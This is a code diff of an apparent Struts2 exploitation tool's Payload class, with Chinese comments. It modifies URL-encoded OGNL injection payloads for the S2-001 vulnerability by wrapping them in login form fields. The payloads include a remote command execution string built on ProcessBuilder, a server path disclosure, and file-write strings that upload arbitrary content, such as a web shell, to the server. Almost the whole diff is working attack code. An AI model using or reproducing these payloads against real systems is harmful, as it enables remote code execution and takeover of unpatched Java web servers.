@@ -51,9 +51,9 @@ public class Payload {
             public static final String USER_UPLOAD0 = "";
             //Struts2_001 POST 需要参数 upload 需要get参数传递shell内容，用"|"分割
             public static final String INFO001 = "[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; ";
-            public static final String POC001 = "%25%7B" + r1 + "%2B" + r2 + "%7D";
-            public static final String EXEC001 = "%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B{OS}%22{EXEC}%22,%22%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D";
-            public static final String PATH001 = "%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%23req.getRealPath%28%27%2F%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%7D";
+            public static final String POC001 = "username=111&password="+"%25%7B" + r1 + "*" + r2 + "%7D";
+            public static final String EXEC001 = "username=111&password="+"%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B{OS}%22{EXEC}%22,%22%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D";
+            public static final String PATH001 = "username=111&password="+"%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%23req.getRealPath%28%27%2F%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%7D";
             public static final String UPLOAD001 = "filename={FILENAME}&content={FILECONTENT}|%25%7b%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2c%23outstr%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2cnew+java.io.BufferedWriter%28new+java.io.FileWriter%28%23req.getRealPath%28%27%2f%27%29%2b%27%2f%27%2b%23req.getParameter%28%27filename%27%29%29%29.append%28%23req.getParameter%28%27content%27%29%29.close%28%29%2c%23outstr.print%28%27UPLO%27%29%2c%23outstr.println%28%27AD-OK%27%29%2c%23outstr.close%28%29%7d";
             public static final String USER_UPLOAD001 = "realpath={REALPATH}&content={FILECONTENT}|%25%7b%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2c%23outstr%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2cnew+java.io.BufferedWriter%28new+java.io.FileWriter%28%23req.getParameter%28%27realpath%27%29%29%29.append%28%23req.getParameter%28%27content%27%29%29.close%28%29%2c%23outstr.print%28%27UPLO%27%29%2c%23outstr.println%28%27AD-OK%27%29%2c%23outstr.close%28%29%7d";
 
@@ -204,9 +204,9 @@ public class Payload {
         }
 
         public static String[] s2_list = {
-                "s001", "s005", "s007", "s008", "s009",
-                "s012", "s013", "s015", "s016", "s019",
-                "sdev", "s032", "s037", "s045", "s046"
+                "001", "005", "007", "008", "009",
+                "012", "013", "015", "016", "019",
+                "dev", "032", "037", "045", "046"
         };
 
         public enum PAYLOAD {
@@ -288,6 +288,7 @@ public class Payload {
 
         public void getExec(String name) {
         this.usename = name;
+        this.use = PAYLOAD.valueOf(name).exec;
         this.method = PAYLOAD.valueOf(name).method;
         this.info = PAYLOAD.valueOf(name).info;
     }
